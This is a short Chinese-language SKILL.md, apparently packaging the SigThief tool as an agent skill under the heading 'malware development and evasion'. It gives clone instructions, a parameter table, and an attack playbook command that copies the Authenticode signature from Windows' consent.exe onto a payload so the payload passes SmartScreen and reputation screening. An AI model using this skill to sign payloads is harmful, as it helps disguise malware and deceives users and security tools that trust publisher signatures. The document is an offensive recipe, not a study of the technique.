---
name: sigthief-signature
description: SigThief: 签名窃取绕过 SmartScreen。信号:恶意软件开发,免杀开发,偷合法签名,从已签名文件剥离签名信息,只检查签名。
---

# SigThief

- 攻击大类:C45 恶意软件开发与免杀
- 上游仓库:https://github.com/secretsquirrel/SigThief
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/secretsquirrel/SigThief
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python sigthief.py -i legit.exe -t evil.exe -o signed.exe` | 偷合法签名 |
| `-r` | 从已签名文件剥离签名信息 |
| `-c` | 只检查签名 |

## 攻击场景 Playbook

### 签名窃取绕过 SmartScreen

```bash
python sigthief.py -i C:\Windows\System32\consent.exe -t payload.exe -o signed_payload.exe
# 伪签名让文件带'已验证发布者'属性,过部分 SmartScreen/信誉检查
```

## 注意事项

签名是复制非伪造(文件哈希不符),过深度校验会失效;但对初筛/信誉检查有效。
